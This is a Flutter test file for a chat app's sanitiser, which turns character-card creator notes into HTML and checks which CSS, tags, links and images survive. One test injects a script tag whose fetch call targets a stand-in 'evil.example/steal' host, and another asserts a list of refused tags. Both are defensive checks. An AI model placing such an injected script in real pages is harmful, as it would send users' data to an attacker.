import 'package:flutter_test/flutter_test.dart';
import 'package:maichat/services/rich_notes.dart';

/// The creator-notes CSS pass. These are string-level assertions on purpose: the
/// rendering side is covered by the sheet's widget tests, but *what survives the
/// rewrite* is where a card either looks like its author intended or looks like a
/// grey slab, and that is decidable without a render tree.
void main() {
  group('what is kept', () {
    test('a card keeps its own background, padding and colours', () {
      const notes = '<div style="background:#101018; padding:14px; '
          'color:#e8e8f0; border:1px solid #333">Hello</div>';
      final html = creatorNotesToHtml(notes);
      // The chat's renderer strips a wrapper's background; the notes renderer
      // must not — here the styled block *is* the content.
      expect(html, contains('background-color: #101018'));
      expect(html, contains('padding: 14px'));
      expect(html, contains('color: #e8e8f0'));
      expect(html, contains('border: 1px solid #333'));
    });

    test('a gradient degrades to its first colour rather than disappearing',
        () {
      const notes = '<div style="background: linear-gradient(#ff8800, #222)">'
          'x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('background-color: #ff8800'));
    });

    test('a bare colour keyword survives the shorthand narrowing', () {
      final html = creatorNotesToHtml('<p style="background: teal">x</p>');
      expect(html, contains('background-color: teal'));
    });

    test('a <style> block is kept and its rules are tamed too', () {
      const notes = '<style>.card { background: #202030; display: flex; '
          'font-size: 1.5rem }</style><div class="card">x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('<style>'));
      expect(html, contains('background-color: #202030'));
      // flex would have stacked the children into one paragraph.
      expect(html, contains('display: block'));
      expect(html, isNot(contains('flex')));
      expect(html, contains('font-size: 24px'));
    });

    test('images are left in place for the renderer to handle', () {
      final html = creatorNotesToHtml(
          '<img src="https://example.com/banner.png" width="400">');
      expect(html, contains('src="https://example.com/banner.png"'));
      expect(html, contains('width="400"'));
    });

    test('markdown is honoured, so a plainly-written card still formats', () {
      final html = creatorNotesToHtml('**Bold** and *italic*.');
      expect(html, contains('<strong>Bold</strong>'));
      expect(html, contains('<em>italic</em>'));
    });
  });

  group('what is rewritten', () {
    test('rem sizes become px, because rem is not parsed at all', () {
      final html =
          creatorNotesToHtml('<h2 style="font-size:1.4rem">Aria</h2>');
      expect(html, contains('font-size: 22px'));
      expect(html, isNot(contains('rem')));
    });

    test('flex, grid and positioning are dropped, not passed through', () {
      const notes = '<div style="display:flex; justify-content:center; '
          'position:absolute; top:10px; z-index:5; gap:8px">x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('display: block'));
      for (final gone in ['justify-content', 'position', 'top:', 'z-index',
        'gap']) {
        expect(html, isNot(contains(gone)), reason: '$gone survived');
      }
    });

    test('shadows, filters and transforms are dropped', () {
      const notes = '<div style="box-shadow:0 0 8px #000; filter:blur(2px); '
          'transform:rotate(3deg); color:#fff">x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('color: #fff'));
      expect(html, isNot(contains('box-shadow')));
      expect(html, isNot(contains('filter')));
      expect(html, isNot(contains('transform')));
    });

    test('an element left with no drawable style loses the attribute entirely',
        () {
      final html = creatorNotesToHtml('<div style="box-shadow:0 0 2px #000">'
          'x</div>');
      expect(html, isNot(contains('style=')));
      expect(html, contains('x'));
    });
  });

  group('what is refused', () {
    test('a script is removed, source and all', () {
      final html = creatorNotesToHtml(
          '<p>Hi</p><script>fetch("https://evil.example/steal")</script>');
      expect(html, contains('Hi'));
      expect(html, isNot(contains('script')));
      expect(html, isNot(contains('evil.example')));
    });

    test('an iframe and its contents go', () {
      final html = creatorNotesToHtml(
          '<iframe src="https://example.com/page">fallback</iframe>after');
      expect(html, isNot(contains('iframe')));
      expect(html, contains('after'));
    });

    test('unrenderable interactive tags are dropped but their text is kept', () {
      final html = creatorNotesToHtml(
          '<div>before <button>Click me</button> after</div>');
      expect(html, isNot(contains('button')));
      expect(html, contains('before'));
      expect(html, contains('Click me'));
      expect(html, contains('after'));
    });

    test('every dropped tag is also refused at render time', () {
      // The two lists must agree, or a tag the string pass misses (because the
      // HTML parser reconstructed it) would still build.
      expect(kDroppedNoteTags, contains('script'));
      expect(kDroppedNoteTags, contains('iframe'));
      expect(kDroppedNoteTags, contains('form'));
    });
  });

  group('the cheap path', () {
    test('plain prose is not treated as rich', () {
      expect(notesLookRich('She works nights at the archive. 3 < 5 & so on.'),
          isFalse);
    });

    test('anything with real markup is', () {
      expect(notesLookRich('<div style="color:red">x</div>'), isTrue);
      expect(notesLookRich('a <b>bold</b> word'), isTrue);
      expect(notesLookRich('<img src="x.png">'), isTrue);
    });

    test('empty notes convert to nothing at all', () {
      expect(creatorNotesToHtml('   '), isEmpty);
    });
  });

  group('markup that used to come out as its own source', () {
    test('pretty-printed HTML is not read as an indented code block', () {
      // The reported bug, exactly: a card written the way anyone writes HTML.
      // Markdown treats four leading spaces as a code block, and the `<div>`'s
      // own HTML block ends at the first blank line — so everything after it was
      // rendered as literal source, `<img>` included.
      const notes = '''
<div style="background:#111; padding:12px">
    <h2>Elara</h2>

    <p>She is a <b>rogue</b>.</p>

    <img src="https://files.catbox.moe/abc.png" width="400">
</div>
''';
      final html = creatorNotesToHtml(notes);
      expect(html, isNot(contains('<pre>')),
          reason: 'no part of a card is a code block');
      expect(html, isNot(contains('&lt;p&gt;')),
          reason: 'the tags are tags, not text');
      expect(html, contains('<b>rogue</b>'));
      expect(html, contains('<img src="https://files.catbox.moe/abc.png"'),
          reason: 'the picture survives to be drawn');
    });

    test('a fenced code block is still shown verbatim', () {
      const notes = '<p>Use this:</p>\n\n```\n    <div>keep me</div>\n```';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('<code>'));
      expect(html, contains('&lt;div&gt;keep me&lt;/div&gt;'));
    });

    test('escaped markup is rendered as markup', () {
      // Several catalogue APIs hand notes back HTML-encoded. Left alone the
      // reader sees the source instead of the card.
      const notes = '&lt;div style="color:#f00"&gt;Hello &lt;b&gt;there'
          '&lt;/b&gt;&lt;img src="https://files.catbox.moe/z.png"&gt;&lt;/div&gt;';
      expect(notesLookRich(notes), isTrue);
      final html = creatorNotesToHtml(notes);
      expect(html, contains('color: #f00'));
      expect(html, contains('<b>there</b>'));
      expect(html, contains('src="https://files.catbox.moe/z.png"'));
    });

    test('an escaped example inside a real card is left as the example', () {
      // `&lt;name&gt;` is a placeholder the author wants *shown*. Unescaping it
      // would delete it from the page, and the real tags already work.
      final html = creatorNotesToHtml(
          '<p>Call them &lt;name&gt; when you meet.</p>');
      expect(html, contains('&lt;name&gt;'));
      expect(html, contains('<p>'));
    });
  });

  group('links and linked pictures', () {
    test('a markdown link is a link, not four pieces of punctuation', () {
      const notes = 'Read [the wiki](https://example.com/page) first.';
      expect(notesLookRich(notes), isTrue,
          reason: 'plain-text notes would show the brackets as typed');
      expect(creatorNotesToHtml(notes),
          contains('<a href="https://example.com/page">the wiki</a>'));
    });

    test('a bare picture link becomes the picture', () {
      const notes = 'Art: https://files.catbox.moe/abc.png';
      expect(notesLookRich(notes), isTrue);
      final html = creatorNotesToHtml(notes);
      expect(html, contains('<img src="https://files.catbox.moe/abc.png"'));
      expect(html, isNot(contains('<a href')));
    });

    test('a labelled link to a picture stays a link', () {
      // The author wrote words instead of showing it; that is a choice.
      final html = creatorNotesToHtml('[full size](https://x.tld/art.png)');
      expect(html, contains('<a href="https://x.tld/art.png">full size</a>'));
      expect(html, isNot(contains('<img')));
    });

    test('a bare picture link inside a card becomes the picture too', () {
      // Markdown hands a raw HTML block through untouched and auto-links nothing
      // inside it, so a URL sitting in a card's own `<div>` arrives as plain text
      // rather than as an `<a>`.
      final html = creatorNotesToHtml(
          '<div style="color:#fff">Art: https://files.catbox.moe/abc.png</div>');
      expect(html, contains('<img src="https://files.catbox.moe/abc.png"'));
    });

    test('a URL inside a <style> rule is left alone', () {
      // `url(…png)` is CSS, not a picture to draw in the flow.
      final html = creatorNotesToHtml(
          '<style>.card { background: url(https://x.tld/bg.png) }</style>'
          '<div class="card">x</div>');
      expect(html, isNot(contains('<img')));
    });

    test('a bare link to a page is left as a link', () {
      final html =
          creatorNotesToHtml('See https://example.com/about and [x](https://y.tld).');
      expect(html, contains('<a href="https://example.com/about"'));
      expect(html, isNot(contains('<img')));
    });

    test('plain prose still takes the cheap path', () {
      // The collapsible plain-text block is what keeps a long note from paying
      // for a DOM; only markup, escaped markup and links promote a note.
      expect(notesLookRich('She grew up in the harbour district.'), isFalse);
      expect(notesLookRich('A note with 3 < 5 in it.'), isFalse);
    });
  });

  group('cost', () {
    test('a large card converts once and quickly', () {
      // A pathological card: 400 styled rows, well past anything real.
      final notes = StringBuffer();
      for (var i = 0; i < 400; i++) {
        notes.write('<div style="background:#101018; padding:4px; '
            'font-size:0.9rem; box-shadow:0 0 2px #000">Row $i</div>');
      }
      final source = notes.toString();
      final watch = Stopwatch()..start();
      final html = creatorNotesToHtml(source);
      watch.stop();
      expect(html, contains('Row 399'));
      // Generous, because a CI runner is not a phone — this is a guard against
      // an accidentally quadratic rewrite, not a benchmark.
      expect(watch.elapsedMilliseconds, lessThan(1500));
    });

    test('the conversion is deterministic, so caching it by source is sound',
        () {
      const notes = '<div style="background:#123456; font-size:1.1rem">x</div>';
      expect(creatorNotesToHtml(notes), creatorNotesToHtml(notes));
    });
  });
}
